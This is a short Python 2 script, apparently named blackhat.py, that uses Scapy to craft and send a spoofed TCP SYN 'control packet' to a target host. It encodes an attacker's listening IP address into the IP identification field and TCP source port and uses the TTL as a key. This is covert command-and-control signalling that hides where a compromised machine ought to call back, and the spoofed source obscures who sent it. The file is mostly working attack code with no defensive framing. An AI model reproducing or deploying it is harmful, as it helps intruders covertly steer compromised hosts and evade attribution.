import sys
import time
import random
from scapy.all import *
import socket



## Helper Functions

#Function takes in IP identification field & TCP source port data as ints, and then deconstructs them
# to construct the IP address
def deconstructIP(IP_id,TCP_sport):

    print "===DECONSTRUCTING IP ADDRESS==="
    print "IP id is " + str(IP_id)
    print "TCP Sport is" + str(TCP_sport)
    #convert to bits
    partition1 = bin(IP_id)[2:].zfill(8)
    partition2 = bin(TCP_sport)[2:].zfill(8)

    print partition1
    print partition2

    print len(partition1)
    print len(partition2)

    if len(partition1) < 16:
        partition1 = padPartition(partition1)
    if len(partition2) < 16:
        partition2 = padPartition(partition2) 
        
      
        

    print len(partition1)
    print len(partition2)

    seg1 = partition1[0:8]
    seg2 = partition1[8:16]
        #print "seg1 = " + seg1
        #print "seg2 = " + seg2


    seg3 = partition2[0:8]
    seg4 = partition2[8:16]
        #print "seg3 = " + seg3
        #print "seg4 = " + seg4
    
    print "IP Address " + str(int(seg1,2))+"."+str(int(seg2,2))+"."+str(int(seg3,2))+"."+str(int(seg4,2))
    

#If a partition is less than 16 bits (e.g. x.x.0.11 would only show up at as 101100001011), pad with necessary 0s
def padPartition(partition):
    partition = int(partition,2)
    partition = format(partition,'016b')
    return partition


def craftControlPacket(option,targetIP,listeningIP,spoofedIP, TTLkey):

    #1.A Split first 8 bits of IP address into the IP identification field
    print(listeningIP)

    #1.a Grab the current IP address in bits.
    bits_listIP = socket.inet_aton(listeningIP)
    #convert those bits to integers
    address  = ([ord(i) for i in bits_listIP])
        #DEBUG: print(address)
    
    #1.b Convert integers into uint8
    bin_listIP = ([bin(i)[2:].zfill(8) for i in address]);
        #DEBUG: print(bin_listIP)

    #1.c Split into IP Identification field data
    # &  TCP Sport data.
    partition1 = bin_listIP[0] + bin_listIP[1]
    partition2 = bin_listIP[2] + bin_listIP[3]  
    print partition1
    print partition2

    #1.d Convert the uint8 bits going to each field 
    # into integers as expected by Scapy API
    IP_id = int(partition1,2)
    print "IP ID is " + str(IP_id)
        #DEBUG: print partition2
    
    TCP_sport = int(partition2,2)
    print "TCP Sport is " + str(TCP_sport)

    deconstructIP(IP_id,TCP_sport)

    print "TTL Key is " + str(TTLkey)

    pkt = IP(src=spoofedIP,dst=targetIP, id=IP_id, ttl=TTLkey)/TCP(sport=TCP_sport, dport=80, flags="S")
    # return pkt
    return pkt



# Main
print 'Number of arguments:', len(sys.argv), 'arguments.'
print 'Argument List:', str(sys.argv)

if len(sys.argv) < 6:
    print "Please enter commands in format python blackhat.py <Mode> <TargetIP> <BlackhatIP> <SpoofedIP> <TTLkey>"
    sys.exit()

#Assign Variables
option = sys.argv[1]
targetIP = sys.argv[2]
listeningIP = sys.argv[3]
spoofedIP = sys.argv[4]
TTLkey = int(sys.argv[5])

if option == "1":
    send(craftControlPacket(option, targetIP, listeningIP, spoofedIP, TTLkey));
else:
    print "Something else"
